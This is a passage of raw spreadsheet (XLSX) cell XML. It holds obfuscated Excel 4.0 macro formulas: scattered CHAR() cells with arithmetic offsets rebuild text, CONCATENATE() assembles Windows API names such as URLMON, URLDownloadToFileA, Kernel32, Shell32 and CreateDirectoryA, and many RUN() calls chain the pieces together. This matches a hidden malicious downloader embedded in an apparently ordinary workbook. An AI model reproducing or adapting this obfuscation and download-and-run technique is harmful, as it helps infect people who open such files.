    </row>
    <row r="1343" spans="21:171" x14ac:dyDescent="0.25">
      <c r="AB1343">
        <v>72</v>
      </c>
    </row>
    <row r="1344" spans="21:171" x14ac:dyDescent="0.25">
      <c r="AT1344" t="str">
        <f>CHAR($IL$221-14)</f>
        <v>A</v>
      </c>
    </row>
    <row r="1349" spans="131:233" x14ac:dyDescent="0.25">
      <c r="HD1349">
        <v>609</v>
      </c>
    </row>
    <row r="1352" spans="131:233" x14ac:dyDescent="0.25">
      <c r="FK1352">
        <v>71</v>
      </c>
    </row>
    <row r="1353" spans="131:233" x14ac:dyDescent="0.25">
      <c r="HY1353">
        <v>94</v>
      </c>
    </row>
    <row r="1355" spans="131:233" x14ac:dyDescent="0.25">
      <c r="EI1355">
        <v>81</v>
      </c>
    </row>
    <row r="1359" spans="131:233" x14ac:dyDescent="0.25">
      <c r="EA1359">
        <v>92</v>
      </c>
    </row>
    <row r="1363" spans="22:218" x14ac:dyDescent="0.25">
      <c r="CT1363" t="str">
        <f>CHAR($HM$1630-14)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1369" spans="22:218" x14ac:dyDescent="0.25">
      <c r="V1369">
        <v>3</v>
      </c>
    </row>
    <row r="1370" spans="22:218" x14ac:dyDescent="0.25">
      <c r="FT1370" t="str">
        <f>CHAR($CP$861-563)</f>
        <v>9</v>
      </c>
    </row>
    <row r="1373" spans="22:218" x14ac:dyDescent="0.25">
      <c r="EY1373" t="str">
        <f>CHAR($GI$244-563)</f>
        <v>e</v>
      </c>
      <c r="HG1373">
        <v>7</v>
      </c>
      <c r="HJ1373">
        <v>58</v>
      </c>
    </row>
    <row r="1378" spans="59:230" x14ac:dyDescent="0.25">
      <c r="CK1378">
        <v>61</v>
      </c>
      <c r="EE1378" t="b">
        <f>RUN($EU$58)</f>
        <v>0</v>
      </c>
      <c r="HV1378">
        <v>115</v>
      </c>
    </row>
    <row r="1382" spans="59:230" x14ac:dyDescent="0.25">
      <c r="FT1382">
        <v>1034</v>
      </c>
    </row>
    <row r="1383" spans="59:230" x14ac:dyDescent="0.25">
      <c r="DX1383" t="b">
        <f>RUN($GZ$939)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1385" spans="59:230" x14ac:dyDescent="0.25">
      <c r="CU1385">
        <v>9</v>
      </c>
    </row>
    <row r="1388" spans="59:230" x14ac:dyDescent="0.25">
      <c r="BG1388">
        <v>47</v>
      </c>
    </row>
    <row r="1402" spans="14:155" x14ac:dyDescent="0.25">
      <c r="N1402" t="b">
        <f>RUN($IN$856)</f>
        <v>0</v>
      </c>
      <c r="AC1402">
        <v>114</v>
      </c>
    </row>
    <row r="1407" spans="14:155" x14ac:dyDescent="0.25">
      <c r="EY1407">
        <v>34</v>
      </c>
    </row>
    <row r="1408" spans="14:155" x14ac:dyDescent="0.25">
      <c r="DL1408">
        <v>56</v>
      </c>
    </row>
    <row r="1412" spans="28:211" x14ac:dyDescent="0.25">
      <c r="AU1412">
        <v>29</v>
      </c>
    </row>
    <row r="1413" spans="28:211" x14ac:dyDescent="0.25">
      <c r="HC1413" t="b">
        <f>RUN($IB$159)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1414" spans="28:211" x14ac:dyDescent="0.25">
      <c r="GR1414" t="b">
        <f>RUN($CZ$53)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1415" spans="28:211" x14ac:dyDescent="0.25">
      <c r="EL1415" t="b">
        <f>RUN($FK$1957)</f>
        <v>0</v>
      </c>
      <c r="EU1415" t="str">
        <f>CHAR($X$687-563)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1416" spans="28:211" x14ac:dyDescent="0.25">
      <c r="FX1416" t="str">
        <f>CHAR($BT$63-14)</f>
        <v>F</v>
      </c>
    </row>
    <row r="1417" spans="28:211" x14ac:dyDescent="0.25">
      <c r="FD1417" t="str">
        <f>CHAR($W$511-563)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1418" spans="28:211" x14ac:dyDescent="0.25">
      <c r="GT1418">
        <v>31</v>
      </c>
    </row>
    <row r="1423" spans="28:211" x14ac:dyDescent="0.25">
      <c r="AB1423" t="b">
        <f>RUN($FX$1534)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1428" spans="63:197" x14ac:dyDescent="0.25">
      <c r="GO1428" t="str">
        <f>CONCATENATE($AW$818)</f>
        <v>URLMON</v>
      </c>
    </row>
    <row r="1437" spans="63:197" x14ac:dyDescent="0.25">
      <c r="EK1437">
        <v>156</v>
      </c>
    </row>
    <row r="1439" spans="63:197" x14ac:dyDescent="0.25">
      <c r="BK1439">
        <v>55</v>
      </c>
    </row>
    <row r="1442" spans="64:86" x14ac:dyDescent="0.25">
      <c r="BL1442">
        <v>668</v>
      </c>
    </row>
    <row r="1448" spans="64:86" x14ac:dyDescent="0.25">
      <c r="CH1448" t="b">
        <f>RUN($IE$533)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1460" spans="15:169" x14ac:dyDescent="0.25">
      <c r="O1460">
        <v>77</v>
      </c>
    </row>
    <row r="1462" spans="15:169" x14ac:dyDescent="0.25">
      <c r="DP1462">
        <v>94</v>
      </c>
      <c r="EZ1462" t="b">
        <f>RUN($GC$829)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1463" spans="15:169" x14ac:dyDescent="0.25">
      <c r="FM1463" t="str">
        <f>CHAR($DX$1898-58)</f>
        <v>D</v>
      </c>
    </row>
    <row r="1475" spans="22:213" x14ac:dyDescent="0.25">
      <c r="EN1475" t="str">
        <f>CONCATENATE($BW$379)</f>
        <v>Kernel32</v>
      </c>
    </row>
    <row r="1476" spans="22:213" x14ac:dyDescent="0.25">
      <c r="BL1476" t="b">
        <f>RUN($EE$1165)</f>
        <v>0</v>
      </c>
      <c r="ET1476">
        <v>673</v>
      </c>
    </row>
    <row r="1478" spans="22:213" x14ac:dyDescent="0.25">
      <c r="FP1478" t="str">
        <f>CHAR($BT$902-14)</f>
        <v>p</v>
      </c>
    </row>
    <row r="1482" spans="22:213" x14ac:dyDescent="0.25">
      <c r="HE1482" t="str">
        <f>CHAR($HF$1060-14)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1483" spans="22:213" x14ac:dyDescent="0.25">
      <c r="V1483">
        <v>81</v>
      </c>
      <c r="BY1483">
        <v>52</v>
      </c>
      <c r="CL1483">
        <v>49</v>
      </c>
    </row>
    <row r="1486" spans="22:213" x14ac:dyDescent="0.25">
      <c r="GU1486">
        <v>675</v>
      </c>
    </row>
    <row r="1487" spans="22:213" x14ac:dyDescent="0.25">
      <c r="DI1487">
        <v>79</v>
      </c>
    </row>
    <row r="1489" spans="112:240" x14ac:dyDescent="0.25">
      <c r="GM1489">
        <v>113</v>
      </c>
    </row>
    <row r="1490" spans="112:240" x14ac:dyDescent="0.25">
      <c r="IF1490">
        <v>24</v>
      </c>
    </row>
    <row r="1492" spans="112:240" x14ac:dyDescent="0.25">
      <c r="FO1492" t="b">
        <f>RUN($BT$1286)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1498" spans="112:240" x14ac:dyDescent="0.25">
      <c r="DH1498" t="str">
        <f>CHAR($EC$1563-58)</f>
        <v>r</v>
      </c>
      <c r="DU1498">
        <v>69</v>
      </c>
    </row>
    <row r="1506" spans="1:240" x14ac:dyDescent="0.25">
      <c r="IF1506">
        <v>36</v>
      </c>
    </row>
    <row r="1509" spans="1:240" x14ac:dyDescent="0.25">
      <c r="EB1509" t="str">
        <f>CHAR($GF$168-563)</f>
        <v>a</v>
      </c>
    </row>
    <row r="1510" spans="1:240" x14ac:dyDescent="0.25">
      <c r="EL1510" t="str">
        <f>CHAR($AS$1759-933)</f>
        <v>n</v>
      </c>
    </row>
    <row r="1512" spans="1:240" x14ac:dyDescent="0.25">
      <c r="GG1512">
        <v>33</v>
      </c>
    </row>
    <row r="1515" spans="1:240" x14ac:dyDescent="0.25">
      <c r="A1515" t="b">
        <f>RUN($AX$887)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1527" spans="8:180" x14ac:dyDescent="0.25">
      <c r="H1527">
        <v>77</v>
      </c>
      <c r="DZ1527" t="b">
        <f>RUN($N$44)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1531" spans="8:180" x14ac:dyDescent="0.25">
      <c r="EH1531">
        <v>74</v>
      </c>
    </row>
    <row r="1532" spans="8:180" x14ac:dyDescent="0.25">
      <c r="EO1532" t="str">
        <f>CHAR($DV$19-563)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1534" spans="8:180" x14ac:dyDescent="0.25">
      <c r="FX1534" t="b">
        <f>RUN($CB$771)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1539" spans="64:181" x14ac:dyDescent="0.25">
      <c r="DV1539">
        <v>26</v>
      </c>
    </row>
    <row r="1543" spans="64:181" x14ac:dyDescent="0.25">
      <c r="FY1543" t="b">
        <f>RUN($BW$450)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1544" spans="64:181" x14ac:dyDescent="0.25">
      <c r="CF1544">
        <v>75</v>
      </c>
    </row>
    <row r="1545" spans="64:181" x14ac:dyDescent="0.25">
      <c r="BL1545">
        <v>82</v>
      </c>
    </row>
    <row r="1548" spans="64:181" x14ac:dyDescent="0.25">
      <c r="EE1548">
        <v>90</v>
      </c>
    </row>
    <row r="1555" spans="8:192" x14ac:dyDescent="0.25">
      <c r="X1555" t="b">
        <f>RUN($GY$1217)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1558" spans="8:192" x14ac:dyDescent="0.25">
      <c r="GJ1558" t="b">
        <f>RUN($FF$1755)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1562" spans="8:192" x14ac:dyDescent="0.25">
      <c r="AA1562" t="str">
        <f>CONCATENATE($EQ$1686)</f>
        <v>CreateDirectoryA</v>
      </c>
    </row>
    <row r="1563" spans="8:192" x14ac:dyDescent="0.25">
      <c r="EC1563">
        <v>172</v>
      </c>
    </row>
    <row r="1567" spans="8:192" x14ac:dyDescent="0.25">
      <c r="H1567">
        <v>94</v>
      </c>
      <c r="GC1567">
        <v>71</v>
      </c>
    </row>
    <row r="1568" spans="8:192" x14ac:dyDescent="0.25">
      <c r="CJ1568">
        <v>41</v>
      </c>
    </row>
    <row r="1574" spans="18:201" x14ac:dyDescent="0.25">
      <c r="R1574" t="str">
        <f>CHAR($BZ$282-933)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1575" spans="18:201" x14ac:dyDescent="0.25">
      <c r="ET1575">
        <v>44</v>
      </c>
    </row>
    <row r="1577" spans="18:201" x14ac:dyDescent="0.25">
      <c r="GS1577">
        <v>32</v>
      </c>
    </row>
    <row r="1588" spans="41:128" x14ac:dyDescent="0.25">
      <c r="CY1588" t="str">
        <f>CHAR($CP$1235-563)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1593" spans="41:128" x14ac:dyDescent="0.25">
      <c r="DX1593" t="str">
        <f>CHAR($BC$840-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1594" spans="41:128" x14ac:dyDescent="0.25">
      <c r="CR1594" t="str">
        <f>CHAR($C$1890-14)</f>
        <v>R</v>
      </c>
    </row>
    <row r="1599" spans="41:128" x14ac:dyDescent="0.25">
      <c r="AO1599">
        <v>11</v>
      </c>
    </row>
    <row r="1613" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1613" t="str">
        <f>CHAR($HZ$86-563)</f>
        <v>n</v>
      </c>
    </row>
    <row r="1620" spans="41:221" x14ac:dyDescent="0.25">
      <c r="AO1620">
        <v>83</v>
      </c>
    </row>
    <row r="1623" spans="41:221" x14ac:dyDescent="0.25">
      <c r="EA1623">
        <v>90</v>
      </c>
      <c r="EW1623" t="str">
        <f>CHAR($ES$1716-563)</f>
        <v>v</v>
      </c>
    </row>
    <row r="1626" spans="41:221" x14ac:dyDescent="0.25">
      <c r="DG1626">
        <v>29</v>
      </c>
    </row>
    <row r="1630" spans="41:221" x14ac:dyDescent="0.25">
      <c r="AO1630">
        <v>71</v>
      </c>
      <c r="CL1630">
        <v>67</v>
      </c>
      <c r="DW1630">
        <v>24</v>
      </c>
      <c r="HM1630">
        <v>122</v>
      </c>
    </row>
    <row r="1631" spans="41:221" x14ac:dyDescent="0.25">
      <c r="GR1631">
        <v>1016</v>
      </c>
    </row>
    <row r="1633" spans="56:242" x14ac:dyDescent="0.25">
      <c r="FW1633">
        <v>161</v>
      </c>
    </row>
    <row r="1636" spans="56:242" x14ac:dyDescent="0.25">
      <c r="DW1636" t="str">
        <f>CHAR($CA$1669-58)</f>
        <v>a</v>
      </c>
    </row>
    <row r="1637" spans="56:242" x14ac:dyDescent="0.25">
      <c r="FI1637">
        <v>32</v>
      </c>
      <c r="IH1637" t="str">
        <f>CHAR($EE$1656-563)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1638" spans="56:242" x14ac:dyDescent="0.25">
      <c r="BD1638" t="b">
        <f>RUN($BK$1110)</f>
        <v>0</v>
      </c>
      <c r="BP1638" t="str">
        <f>CHAR($EK$1437-58)</f>
        <v>b</v>
      </c>
    </row>
    <row r="1645" spans="56:242" x14ac:dyDescent="0.25">
      <c r="FP1645">
        <v>135</v>
      </c>
    </row>
    <row r="1646" spans="56:242" x14ac:dyDescent="0.25">
      <c r="DO1646">
        <v>95</v>
      </c>
    </row>
    <row r="1648" spans="56:242" x14ac:dyDescent="0.25">
      <c r="FV1648">
        <v>13</v>
      </c>
    </row>
    <row r="1651" spans="26:224" x14ac:dyDescent="0.25">
      <c r="EQ1651">
        <v>39</v>
      </c>
    </row>
    <row r="1652" spans="26:224" x14ac:dyDescent="0.25">
      <c r="EA1652" t="b">
        <f>RUN($FZ$1900)</f>
        <v>0</v>
      </c>
      <c r="GZ1652" t="b">
        <f>RUN($FF$1204)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1655" spans="26:224" x14ac:dyDescent="0.25">
      <c r="Z1655">
        <v>64</v>
      </c>
    </row>
    <row r="1656" spans="26:224" x14ac:dyDescent="0.25">
      <c r="EE1656">
        <v>610</v>
      </c>
    </row>
    <row r="1659" spans="26:224" x14ac:dyDescent="0.25">
      <c r="HP1659">
        <v>82</v>
      </c>
    </row>
    <row r="1661" spans="26:224" x14ac:dyDescent="0.25">
      <c r="EB1661">
        <v>118</v>
      </c>
    </row>
    <row r="1665" spans="66:166" x14ac:dyDescent="0.25">
      <c r="BN1665" t="b">
        <f>RUN($AP$44)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1669" spans="66:166" x14ac:dyDescent="0.25">
      <c r="CA1669">
        <v>155</v>
      </c>
    </row>
    <row r="1675" spans="66:166" x14ac:dyDescent="0.25">
      <c r="FJ1675" t="str">
        <f>CHAR($AN$1842-563)</f>
        <v>.</v>
      </c>
    </row>
    <row r="1680" spans="66:166" x14ac:dyDescent="0.25">
      <c r="DX1680" t="b">
        <f>RUN($BC$130)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1686" spans="18:169" x14ac:dyDescent="0.25">
      <c r="AQ1686">
        <v>668</v>
      </c>
      <c r="EQ1686" t="str">
        <f>CONCATENATE($FQ$383,$AV$149,$GC$1258,$CM$174,$BW$722,$DY$377,$HQ$1796,$GN$1165,$BZ$588,$AI$749,$EP$1814,$IE$353,$FH$770,$HI$28,$EQ$949,$U$437)</f>
        <v>CreateDirectoryA</v>
      </c>
    </row>
    <row r="1687" spans="18:169" x14ac:dyDescent="0.25">
      <c r="FM1687" t="b">
        <f>RUN($GQ$1105)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1689" spans="18:169" x14ac:dyDescent="0.25">
      <c r="ET1689">
        <v>41</v>
      </c>
    </row>
    <row r="1693" spans="18:169" x14ac:dyDescent="0.25">
      <c r="R1693" t="b">
        <f>RUN($U$1728)</f>
        <v>0</v>
      </c>
      <c r="CC1693" t="str">
        <f>CHAR($GX$585-14)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1706" spans="50:214" x14ac:dyDescent="0.25">
      <c r="AX1706">
        <v>166</v>
      </c>
      <c r="CM1706">
        <v>42</v>
      </c>
    </row>
    <row r="1707" spans="50:214" x14ac:dyDescent="0.25">
      <c r="GF1707" t="b">
        <f>RUN($AV$325)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1708" spans="50:214" x14ac:dyDescent="0.25">
      <c r="GH1708" t="str">
        <f>CHAR($EJ$65-563)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1709" spans="50:214" x14ac:dyDescent="0.25">
      <c r="HF1709">
        <v>679</v>
      </c>
    </row>
    <row r="1710" spans="50:214" x14ac:dyDescent="0.25">
      <c r="DM1710">
        <v>673</v>
      </c>
    </row>
    <row r="1716" spans="11:205" x14ac:dyDescent="0.25">
      <c r="ES1716">
        <v>681</v>
      </c>
    </row>
    <row r="1717" spans="11:205" x14ac:dyDescent="0.25">
      <c r="K1717">
        <v>54</v>
      </c>
    </row>
    <row r="1722" spans="11:205" x14ac:dyDescent="0.25">
      <c r="CC1722" t="b">
        <f>RUN($CZ$44)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1725" spans="11:205" x14ac:dyDescent="0.25">
      <c r="EH1725">
        <v>93</v>
      </c>
    </row>
    <row r="1728" spans="11:205" x14ac:dyDescent="0.25">
      <c r="U1728" t="b">
        <f>RUN($GS$246)</f>
        <v>0</v>
      </c>
      <c r="DE1728">
        <v>56</v>
      </c>
      <c r="GW1728" t="b">
        <f>RUN($GB$643)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1729" spans="31:225" x14ac:dyDescent="0.25">
      <c r="HQ1729" t="b">
        <f>RUN($CC$1722)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1730" spans="31:225" x14ac:dyDescent="0.25">
      <c r="AE1730">
        <v>29</v>
      </c>
      <c r="CC1730">
        <v>29</v>
      </c>
    </row>
    <row r="1731" spans="31:225" x14ac:dyDescent="0.25">
      <c r="BP1731">
        <v>89</v>
      </c>
    </row>
    <row r="1732" spans="31:225" x14ac:dyDescent="0.25">
      <c r="BY1732">
        <v>53</v>
      </c>
    </row>
    <row r="1733" spans="31:225" x14ac:dyDescent="0.25">
      <c r="CR1733" t="str">
        <f>CHAR($FM$632-58)</f>
        <v>a</v>
      </c>
    </row>
    <row r="1734" spans="31:225" x14ac:dyDescent="0.25">
      <c r="DS1734">
        <v>664</v>
      </c>
    </row>
    <row r="1741" spans="31:225" x14ac:dyDescent="0.25">
      <c r="FE1741">
        <v>124</v>
      </c>
    </row>
    <row r="1745" spans="27:162" x14ac:dyDescent="0.25">
      <c r="AA1745">
        <v>30</v>
      </c>
    </row>
    <row r="1748" spans="27:162" x14ac:dyDescent="0.25">
      <c r="EC1748">
        <v>1008</v>
      </c>
    </row>
    <row r="1752" spans="27:162" x14ac:dyDescent="0.25">
      <c r="DO1752">
        <v>673</v>
      </c>
    </row>
    <row r="1755" spans="27:162" x14ac:dyDescent="0.25">
      <c r="FF1755" t="b">
        <f>RUN($EW$867)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1758" spans="27:162" x14ac:dyDescent="0.25">
      <c r="EX1758" t="str">
        <f>CHAR($IM$1207-14)</f>
        <v>l</v>
      </c>
    </row>
    <row r="1759" spans="27:162" x14ac:dyDescent="0.25">
      <c r="AS1759">
        <v>1043</v>
      </c>
    </row>
    <row r="1761" spans="25:159" x14ac:dyDescent="0.25">
      <c r="Y1761">
        <v>984</v>
      </c>
    </row>
    <row r="1773" spans="25:159" x14ac:dyDescent="0.25">
      <c r="FC1773" t="str">
        <f>CHAR($BL$1545-14)</f>
        <v>D</v>
      </c>
    </row>
    <row r="1777" spans="58:199" x14ac:dyDescent="0.25">
      <c r="GQ1777" t="str">
        <f>CHAR($EL$1170-58)</f>
        <v>k</v>
      </c>
    </row>
    <row r="1778" spans="58:199" x14ac:dyDescent="0.25">
      <c r="DS1778">
        <v>59</v>
      </c>
    </row>
    <row r="1782" spans="58:199" x14ac:dyDescent="0.25">
      <c r="CM1782">
        <v>1</v>
      </c>
    </row>
    <row r="1785" spans="58:199" x14ac:dyDescent="0.25">
      <c r="BH1785">
        <v>94</v>
      </c>
    </row>
    <row r="1790" spans="58:199" x14ac:dyDescent="0.25">
      <c r="BF1790">
        <v>83</v>
      </c>
      <c r="EK1790">
        <v>170</v>
      </c>
    </row>
    <row r="1794" spans="29:232" x14ac:dyDescent="0.25">
      <c r="AC1794">
        <v>155</v>
      </c>
    </row>
    <row r="1796" spans="29:232" x14ac:dyDescent="0.25">
      <c r="BJ1796">
        <v>52</v>
      </c>
      <c r="HQ1796" t="str">
        <f>CHAR($HE$563-14)</f>
        <v>D</v>
      </c>
    </row>
    <row r="1797" spans="29:232" x14ac:dyDescent="0.25">
      <c r="HX1797" t="str">
        <f>CHAR($EP$492-58)</f>
        <v>m</v>
      </c>
    </row>
    <row r="1799" spans="29:232" x14ac:dyDescent="0.25">
      <c r="GZ1799" t="b">
        <f>RUN($GG$190)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1800" spans="29:232" x14ac:dyDescent="0.25">
      <c r="DW1800">
        <v>26</v>
      </c>
    </row>
    <row r="1803" spans="29:232" x14ac:dyDescent="0.25">
      <c r="AU1803" t="b">
        <f>RUN($FO$1848)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1804" spans="29:232" x14ac:dyDescent="0.25">
      <c r="EM1804">
        <v>618</v>
      </c>
    </row>
    <row r="1806" spans="29:232" x14ac:dyDescent="0.25">
      <c r="BT1806">
        <v>0</v>
      </c>
    </row>
    <row r="1811" spans="31:245" x14ac:dyDescent="0.25">
      <c r="IF1811">
        <v>98</v>
      </c>
    </row>
    <row r="1812" spans="31:245" x14ac:dyDescent="0.25">
      <c r="IA1812" t="str">
        <f>CONCATENATE($FJ$1141,$R$1574,$DC$956,$FG$565,$V$1831,$BJ$623,$FW$699)</f>
        <v>Shell32</v>
      </c>
    </row>
    <row r="1814" spans="31:245" x14ac:dyDescent="0.25">
      <c r="EP1814" t="str">
        <f>CHAR($O$1039-14)</f>
        <v>c</v>
      </c>
    </row>
    <row r="1818" spans="31:245" x14ac:dyDescent="0.25">
      <c r="AE1818">
        <v>99</v>
      </c>
    </row>
    <row r="1821" spans="31:245" x14ac:dyDescent="0.25">
      <c r="IK1821">
        <v>62</v>
      </c>
    </row>
    <row r="1822" spans="31:245" x14ac:dyDescent="0.25">
      <c r="BR1822">
        <v>115</v>
      </c>
      <c r="DY1822" t="str">
        <f>CHAR($FA$1017-563)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1823" spans="31:245" x14ac:dyDescent="0.25">
      <c r="FY1823" t="str">
        <f>CHAR($ED$671-563)</f>
        <v>/</v>
      </c>
    </row>
    <row r="1825" spans="12:236" x14ac:dyDescent="0.25">
      <c r="AS1825">
        <v>169</v>
      </c>
      <c r="HZ1825">
        <v>2</v>
      </c>
    </row>
    <row r="1827" spans="12:236" x14ac:dyDescent="0.25">
      <c r="DX1827" t="b">
        <f>RUN($GK$54)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1828" spans="12:236" x14ac:dyDescent="0.25">
      <c r="DE1828" t="str">
        <f>CHAR($DY$1884-58)</f>
        <v>x</v>
      </c>
      <c r="EX1828" t="str">
        <f>CHAR($DY$1140-58)</f>
        <v>:</v>
      </c>
    </row>
    <row r="1830" spans="12:236" x14ac:dyDescent="0.25">
      <c r="CP1830">
        <v>98</v>
      </c>
      <c r="FO1830">
        <v>16</v>
      </c>
    </row>
    <row r="1831" spans="12:236" x14ac:dyDescent="0.25">
      <c r="V1831" t="str">
        <f>CHAR($EN$879-933)</f>
        <v>l</v>
      </c>
      <c r="DX1831" t="b">
        <f>RUN($DV$327)</f>
        <v>0</v>
      </c>
      <c r="DZ1831">
        <v>15</v>
      </c>
    </row>
    <row r="1833" spans="12:236" x14ac:dyDescent="0.25">
      <c r="IB1833" t="b">
        <f>RUN($FM$1687)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1840" spans="12:236" x14ac:dyDescent="0.25">
      <c r="L1840">
        <v>97</v>
      </c>
      <c r="HL1840">
        <v>7</v>
      </c>
    </row>
    <row r="1842" spans="18:187" x14ac:dyDescent="0.25">
      <c r="AN1842">
        <v>609</v>
      </c>
    </row>
    <row r="1848" spans="18:187" x14ac:dyDescent="0.25">
      <c r="R1848">
        <v>79</v>
      </c>
      <c r="FO1848" t="b">
        <f>RUN($BB$1078)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1851" spans="18:187" x14ac:dyDescent="0.25">
      <c r="AG1851">
        <v>95</v>
      </c>
    </row>
    <row r="1852" spans="18:187" x14ac:dyDescent="0.25">
      <c r="GE1852" t="str">
        <f>CHAR($HQ$1284-58)</f>
        <v>u</v>
      </c>
    </row>
    <row r="1859" spans="17:223" x14ac:dyDescent="0.25">
      <c r="CU1859" t="b">
        <f>RUN($HZ$40)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1865" spans="17:223" x14ac:dyDescent="0.25">
      <c r="BB1865">
        <v>81</v>
      </c>
    </row>
    <row r="1869" spans="17:223" x14ac:dyDescent="0.25">
      <c r="HH1869" t="str">
        <f>CHAR($DT$1204-14)</f>
        <v>A</v>
      </c>
    </row>
    <row r="1870" spans="17:223" x14ac:dyDescent="0.25">
      <c r="HO1870" t="str">
        <f>CHAR($BL$659-58)</f>
        <v>\</v>
      </c>
    </row>
    <row r="1871" spans="17:223" x14ac:dyDescent="0.25">
      <c r="Q1871" t="str">
        <f>CHAR($AC$1402-14)</f>
        <v>d</v>
      </c>
    </row>
    <row r="1873" spans="1:240" x14ac:dyDescent="0.25">
      <c r="CU1873" t="str">
        <f>CHAR($DM$1710-563)</f>
        <v>n</v>
      </c>
    </row>
    <row r="1874" spans="1:240" x14ac:dyDescent="0.25">
      <c r="HT1874" t="b">
        <f>RUN($A$1515)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1877" spans="1:240" x14ac:dyDescent="0.25">
      <c r="CO1877" t="str">
        <f>CHAR($EK$1790-58)</f>
        <v>p</v>
      </c>
    </row>
    <row r="1880" spans="1:240" x14ac:dyDescent="0.25">
      <c r="IF1880">
        <v>670</v>
      </c>
    </row>
    <row r="1883" spans="1:240" x14ac:dyDescent="0.25">
      <c r="FG1883" t="b">
        <f>RUN($GZ$1799)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1884" spans="1:240" x14ac:dyDescent="0.25">
      <c r="DY1884">
        <v>178</v>
      </c>
    </row>
    <row r="1886" spans="1:240" x14ac:dyDescent="0.25">
      <c r="A1886">
        <v>99</v>
      </c>
    </row>
    <row r="1888" spans="1:240" x14ac:dyDescent="0.25">
      <c r="CG1888">
        <v>54</v>
      </c>
    </row>
    <row r="1890" spans="3:238" x14ac:dyDescent="0.25">
      <c r="C1890">
        <v>96</v>
      </c>
    </row>
    <row r="1896" spans="3:238" x14ac:dyDescent="0.25">
      <c r="BQ1896" t="str">
        <f>CHAR($HF$1709-563)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1898" spans="3:238" x14ac:dyDescent="0.25">
      <c r="DX1898">
        <v>126</v>
      </c>
    </row>
    <row r="1900" spans="3:238" x14ac:dyDescent="0.25">
      <c r="FZ1900" t="b">
        <f>RUN($CQ$688)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1902" spans="3:238" x14ac:dyDescent="0.25">
      <c r="ID1902" t="b">
        <f>RUN($CG$564)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1903" spans="3:238" x14ac:dyDescent="0.25">
      <c r="CD1903">
        <v>7</v>
      </c>
      <c r="EO1903">
        <v>673</v>
      </c>
      <c r="HP1903" t="str">
        <f>CHAR($EM$1804-563)</f>
        <v>7</v>
      </c>
    </row>
    <row r="1904" spans="3:238" x14ac:dyDescent="0.25">
      <c r="V1904" t="str">
        <f>CHAR($ET$1476-563)</f>
        <v>n</v>
      </c>
      <c r="HY1904">
        <v>47</v>
      </c>
    </row>
    <row r="1907" spans="30:239" x14ac:dyDescent="0.25">
      <c r="CL1907">
        <v>44</v>
      </c>
      <c r="DA1907">
        <v>80</v>
      </c>
    </row>
    <row r="1909" spans="30:239" x14ac:dyDescent="0.25">
      <c r="AD1909" t="str">
        <f>CHAR($EB$1340-563)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1916" spans="30:239" x14ac:dyDescent="0.25">
      <c r="DN1916">
        <v>57</v>
      </c>
      <c r="DP1916" t="b">
        <f>RUN($W$22)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1917" spans="30:239" x14ac:dyDescent="0.25">
      <c r="CU1917">
        <v>70</v>
      </c>
    </row>
    <row r="1918" spans="30:239" x14ac:dyDescent="0.25">
      <c r="IE1918" t="b">
        <f>RUN($BN$1665)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1920" spans="30:239" x14ac:dyDescent="0.25">
      <c r="DD1920" t="b">
        <f>RUN($AP$1241)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1922" spans="69:229" x14ac:dyDescent="0.25">
      <c r="BV1922">
        <v>111</v>
      </c>
      <c r="ET1922">
        <v>13</v>
      </c>
      <c r="HU1922" t="str">
        <f>CHAR($IK$554-563)</f>
        <v>m</v>
      </c>
    </row>
    <row r="1925" spans="69:229" x14ac:dyDescent="0.25">
      <c r="GI1925">
        <v>93</v>
      </c>
    </row>
    <row r="1926" spans="69:229" x14ac:dyDescent="0.25">
      <c r="BQ1926" t="b">
        <f>RUN($S$654)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1929" spans="69:229" x14ac:dyDescent="0.25">
      <c r="BS1929" t="str">
        <f>CONCATENATE($DF$457)</f>
        <v>URLDownloadToFileA</v>
      </c>
      <c r="CA1929" t="str">
